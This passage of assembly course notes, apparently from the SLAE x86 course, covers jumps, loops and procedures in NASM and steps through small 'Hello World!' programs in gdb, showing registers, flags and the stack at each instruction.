Dump of assembler code from 0x804809f to 0x80480a9:
=> 0x0804809f <_start+31>:	mov    eax,0x0
   0x080480a4 <_start+36>:	or     eax,0x0
   0x080480a7 <_start+39>:	xor    DWORD PTR ds:0x80490d3,0x11223344
End of assembler dump.
0x0804809f in _start ()
2: /x $eax = 0x11
1: /x $al = 0x11
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480a4 to 0x80480ae:
=> 0x080480a4 <_start+36>:	or     eax,0x0
   0x080480a7 <_start+39>:	xor    DWORD PTR ds:0x80490d3,0x11223344
End of assembler dump.
0x080480a4 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <_start+39>:	xor    DWORD PTR ds:0x80490d3,0x11223344
End of assembler dump.
0x080480a7 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x00000000
Dump of assembler code from 0x80480b1 to 0x80480bb:
=> 0x080480b1 <_start+49>:	xor    DWORD PTR ds:0x80490d3,0x11223344
End of assembler dump.
0x080480b1 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480bb to 0x80480c5:
=> 0x080480bb <_start+59>:	mov    eax,0xffffffff
   0x080480c0 <_start+64>:	not    eax
   0x080480c2 <_start+66>:	not    eax
   0x080480c4 <_start+68>:	mov    eax,0x1
End of assembler dump.
0x080480bb in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480c0 to 0x80480ca:
=> 0x080480c0 <_start+64>:	not    eax
   0x080480c2 <_start+66>:	not    eax
   0x080480c4 <_start+68>:	mov    eax,0x1
   0x080480c9 <_start+73>:	mov    ebx,0xa
End of assembler dump.
0x080480c0 in _start ()
2: /x $eax = 0xffffffff
1: /x $al = 0xff
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480c2 to 0x80480cc:
=> 0x080480c2 <_start+66>:	not    eax
   0x080480c4 <_start+68>:	mov    eax,0x1
   0x080480c9 <_start+73>:	mov    ebx,0xa
End of assembler dump.
0x080480c2 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x80480c4 to 0x80480ce:
=> 0x080480c4 <_start+68>:	mov    eax,0x1
   0x080480c9 <_start+73>:	mov    ebx,0xa
End of assembler dump.
0x080480c4 in _start ()
2: /x $eax = 0xffffffff
1: /x $al = 0xff
(gdb) c   
Continuing.
[Inferior 1 (process 1798) exited with code 012]
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0xbbcc
0x80490d3 <var3>:	0x11223344
Error while running hook_stop:
No registers.
(gdb) quit

Control Instructions:

JMP (Unconditional)
* Near Jump (Current code segment)
  - Short; -128 to +127 from current position
* Far Jump (In another segment)

Jxx (Conditional)
* JZ, JNZ, JA, JAE, JC, JNC etc (Uses flags)
* Cannot be used for Far Jumps
 - JNZ label1
 - JMP Far_Label
 - lable1:
 
Vim Control.nasm

; Filename: Control.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        jmp Begin

NeverExecute:

        mov eax, 0x10
        xor ebx, ebx

Begin:
        mov eax, 0x5

PrintHW:

        push eax

        ; Print hello world using write syscall
        mov eax, 0x4
        mov ebx, 1
        mov ecx, message
        mov edx, mlen
        int 0x80

        pop eax
        dec eax
        jnz PrintHW


        mov eax, 0x1
        mov ebx, 0xa            ; sys_exit syscall
        int 0x80

section .data

        message: db "Hello World! "
        mlen     equ $-message

./compile.sh Control
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./Control 
Hello World! Hello World! Hello World! Hello World! Hello World!
gdb -q ./Control
Reading symbols from /SLAE x86/Control/Control...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/Control/Control 

Breakpoint 1, 0x08048080 in _start ()     
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	jmp    0x8048089 <Begin>
End of assembler dump.
(gdb) display/x $eax
1: /x $eax = 0x0
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble $eip,+10
>end
(gdb) nexti
Dump of assembler code from 0x8048089 to 0x8048093:
=> 0x08048089 <Begin+0>:	mov    eax,0x5
   0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
End of assembler dump.
0x08048089 in Begin ()
1: /x $eax = 0x0
(gdb) 
Dump of assembler code from 0x804808e to 0x8048098:
=> 0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808e in PrintHW ()
1: /x $eax = 0x5
(gdb) x/xw $esp
0xbffff710:	0x00000001
(gdb) nexti
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808f in PrintHW ()
1: /x $eax = 0x5
(gdb) x/xw $esp
0xbffff70c:	0x00000005
(gdb) nexti
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <PrintHW+6>:	mov    ebx,0x1
   0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
End of assembler dump.
0x08048094 in PrintHW ()
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
   0x0804809e <PrintHW+16>:	mov    edx,0xd
End of assembler dump.
0x08048099 in PrintHW ()
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <PrintHW+16>:	mov    edx,0xd
   0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
End of assembler dump.
0x0804809e in PrintHW ()
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
End of assembler dump.
0x080480a3 in PrintHW ()
1: /x $eax = 0x4
(gdb) 
Hello World! Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a5 in PrintHW ()
1: /x $eax = 0xd
(gdb) 
Dump of assembler code from 0x80480a6 to 0x80480b0:
=> 0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a6 in PrintHW ()
1: /x $eax = 0x5
(gdb) 
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a7 in PrintHW ()
1: /x $eax = 0x4
(gdb) display $eflags
2: $eflags = [ IF ]
(gdb) nexti
Dump of assembler code from 0x804808e to 0x8048098:
=> 0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808f in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <PrintHW+6>:	mov    ebx,0x1
   0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
End of assembler dump.
0x08048094 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
   0x0804809e <PrintHW+16>:	mov    edx,0xd
End of assembler dump.
0x08048099 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <PrintHW+16>:	mov    edx,0xd
   0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
End of assembler dump.
0x0804809e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
End of assembler dump.
0x080480a3 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Hello World! Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a5 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0xd
(gdb) 
Dump of assembler code from 0x80480a6 to 0x80480b0:
=> 0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a6 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a7 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x3
(gdb) 
Dump of assembler code from 0x804808e to 0x8048098:
=> 0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808e in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x3
(gdb) 
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808f in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x3
(gdb) 
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <PrintHW+6>:	mov    ebx,0x1
   0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
End of assembler dump.
0x08048094 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
   0x0804809e <PrintHW+16>:	mov    edx,0xd
End of assembler dump.
0x08048099 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <PrintHW+16>:	mov    edx,0xd
   0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
End of assembler dump.
0x0804809e in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
End of assembler dump.
0x080480a3 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x4
(gdb) 
Hello World! Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a5 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0xd
(gdb) 
Dump of assembler code from 0x80480a6 to 0x80480b0:
=> 0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a6 in PrintHW ()
2: $eflags = [ PF IF ]
1: /x $eax = 0x3
(gdb) 
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a7 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x2
(gdb) 
Dump of assembler code from 0x804808e to 0x8048098:
=> 0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x2
(gdb) 
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808f in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x2
(gdb) 
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <PrintHW+6>:	mov    ebx,0x1
   0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
End of assembler dump.
0x08048094 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
   0x0804809e <PrintHW+16>:	mov    edx,0xd
End of assembler dump.
0x08048099 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <PrintHW+16>:	mov    edx,0xd
   0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
End of assembler dump.
0x0804809e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
End of assembler dump.
0x080480a3 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Hello World! Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a5 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0xd
(gdb) 
Dump of assembler code from 0x80480a6 to 0x80480b0:
=> 0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a6 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x2
(gdb) 
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a7 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x1
(gdb) 
Dump of assembler code from 0x804808e to 0x8048098:
=> 0x0804808e <PrintHW+0>:	push   eax
   0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x1
(gdb) 
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <PrintHW+1>:	mov    eax,0x4
   0x08048094 <PrintHW+6>:	mov    ebx,0x1
End of assembler dump.
0x0804808f in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x1
(gdb) 
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <PrintHW+6>:	mov    ebx,0x1
   0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
End of assembler dump.
0x08048094 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <PrintHW+11>:	mov    ecx,0x80490b8
   0x0804809e <PrintHW+16>:	mov    edx,0xd
End of assembler dump.
0x08048099 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <PrintHW+16>:	mov    edx,0xd
   0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
End of assembler dump.
0x0804809e in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <PrintHW+21>:	int    0x80
   0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
End of assembler dump.
0x080480a3 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x4
(gdb) 
Hello World! Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <PrintHW+23>:	pop    eax
   0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a5 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0xd
(gdb) 
Dump of assembler code from 0x80480a6 to 0x80480b0:
=> 0x080480a6 <PrintHW+24>:	dec    eax
   0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a6 in PrintHW ()
2: $eflags = [ IF ]
1: /x $eax = 0x1
(gdb) 
Dump of assembler code from 0x80480a7 to 0x80480b1:
=> 0x080480a7 <PrintHW+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a7 in PrintHW ()
2: $eflags = [ PF ZF IF ]
1: /x $eax = 0x0
(gdb) 
Dump of assembler code from 0x80480a9 to 0x80480b3:
=> 0x080480a9 <PrintHW+27>:	mov    eax,0x1
   0x080480ae <PrintHW+32>:	mov    ebx,0xa
End of assembler dump.
0x080480a9 in PrintHW ()
2: $eflags = [ PF ZF IF ]
1: /x $eax = 0x0
(gdb) 
Dump of assembler code from 0x80480ae to 0x80480b8:
=> 0x080480ae <PrintHW+32>:	mov    ebx,0xa
   0x080480b3 <PrintHW+37>:	int    0x80
   0x080480b5:	add    BYTE PTR [eax],al
   0x080480b7:	add    BYTE PTR [eax+0x65],cl
End of assembler dump.
0x080480ae in PrintHW ()
2: $eflags = [ PF ZF IF ]
1: /x $eax = 0x1
(gdb) 
Dump of assembler code from 0x80480b3 to 0x80480bd:
=> 0x080480b3 <PrintHW+37>:	int    0x80
   0x080480b5:	add    BYTE PTR [eax],al
   0x080480b7:	add    BYTE PTR [eax+0x65],cl
   0x080480ba:	ins    BYTE PTR es:[edi],dx
   0x080480bb:	ins    BYTE PTR es:[edi],dx
   0x080480bc:	outs   dx,DWORD PTR ds:[esi]
End of assembler dump.
0x080480b3 in PrintHW ()
2: $eflags = [ PF ZF IF ]
1: /x $eax = 0x1
(gdb) disassemble 
Dump of assembler code for function PrintHW:
   0x0804808e <+0>:	push   eax
   0x0804808f <+1>:	mov    eax,0x4
   0x08048094 <+6>:	mov    ebx,0x1
   0x08048099 <+11>:	mov    ecx,0x80490b8
   0x0804809e <+16>:	mov    edx,0xd
   0x080480a3 <+21>:	int    0x80
   0x080480a5 <+23>:	pop    eax
   0x080480a6 <+24>:	dec    eax
   0x080480a7 <+25>:	jne    0x804808e <PrintHW>
   0x080480a9 <+27>:	mov    eax,0x1
   0x080480ae <+32>:	mov    ebx,0xa
=> 0x080480b3 <+37>:	int    0x80
End of assembler dump.
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4194] will be killed.

Quit anyway? (y or n) y

Loop Exercise:

vim Loop.nasm

; Filename: Control.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        jmp Begin

NeverExecute:

        mov eax, 0x10
        xor ebx, ebx

Begin:
        mov ecx, 0x5

PrintHW:

        push ecx

        ; Print hello world using write syscall
        mov eax, 0x4
        mov ebx, 1
        mov ecx, message
        mov edx, mlen
        int 0x80

        pop ecx
        loop PrintHW

        mov eax, 0x1
        mov ebx, 0xa            ; sys_exit syscall
        int 0x80

section .data

        message: db "Hello World! "
        mlen     equ $-message

./compile.sh Loop
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./Loop 
Hello World! Hello World! Hello World! Hello World! Hello World! 

Procedures:

vim Procedure.nasm


; Filename: Procedure.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text

HelloWorldProc:

        ; Print hello world using write syscall

        mov eax, 0x4
        mov ebx, 1
        mov ecx, message
        mov edx, mlen
        int 0x80
        ret   ; signifies end of procedure


_start:

        mov ecx, 0x10

PrintHelloWorld:

        push ecx
        call HelloWorldProc
        pop ecx
        loop PrintHelloWorld



        mov eax, 1
        mov ebx, 10             ; sys_exit syscall
        int 0x80

section .data

        message: db "Hello World!"
        mlen     equ $-message
	
./compile.sh Procedure
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
./Procedure
Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!
gdb -q ./Procedure
Reading symbols from /SLAE x86/Procedure/Procedure...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048097
(gdb) run
Starting program: /SLAE x86/Procedure/Procedure 

Breakpoint 1, 0x08048097 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048097 <+0>:	mov    ecx,0x10
End of assembler dump.
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x08048080  HelloWorldProc
0x08048097  _start
0x0804809c  PrintHelloWorld
0xb7fff400  __kernel_sigreturn
0xb7fff40c  __kernel_rt_sigreturn
0xb7fff414  __kernel_vsyscall
(gdb) disassemble 0x08048080 
Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
(gdb) nexti
0x0804809c in PrintHelloWorld ()
(gdb) disassemble 
Dump of assembler code for function PrintHelloWorld:
=> 0x0804809c <+0>:	push   ecx
   0x0804809d <+1>:	call   0x8048080 <HelloWorldProc>
   0x080480a2 <+6>:	pop    ecx
   0x080480a3 <+7>:	loop   0x804809c <PrintHelloWorld>
   0x080480a5 <+9>:	mov    eax,0x1
   0x080480aa <+14>:	mov    ebx,0xa
   0x080480af <+19>:	int    0x80
End of assembler dump.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble 
>end
(gdb) nexti
Dump of assembler code for function PrintHelloWorld:
   0x0804809c <+0>:	push   ecx
=> 0x0804809d <+1>:	call   0x8048080 <HelloWorldProc>
   0x080480a2 <+6>:	pop    ecx
   0x080480a3 <+7>:	loop   0x804809c <PrintHelloWorld>
   0x080480a5 <+9>:	mov    eax,0x1
   0x080480aa <+14>:	mov    ebx,0xa
   0x080480af <+19>:	int    0x80
End of assembler dump.
0x0804809d in PrintHelloWorld ()
(gdb) x/xw $esp
0xbffff70c:	0x00000010
(gdb) nexti
Dump of assembler code for function HelloWorldProc:
=> 0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
0x08048080 in HelloWorldProc ()
(gdb) x/xw $esp
0xbffff708:	0x080480a2
(gdb) nexti
Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
=> 0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
0x08048085 in HelloWorldProc ()
(gdb) 
Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
=> 0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
0x0804808a in HelloWorldProc ()
(gdb) 
Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
=> 0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
0x0804808f in HelloWorldProc ()
(gdb) 
Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
=> 0x08048094 <+20>:	int    0x80
   0x08048096 <+22>:	ret    
End of assembler dump.
0x08048094 in HelloWorldProc ()
(gdb) 
Hello World!Dump of assembler code for function HelloWorldProc:
   0x08048080 <+0>:	mov    eax,0x4
   0x08048085 <+5>:	mov    ebx,0x1
   0x0804808a <+10>:	mov    ecx,0x80490b4
   0x0804808f <+15>:	mov    edx,0xc
   0x08048094 <+20>:	int    0x80
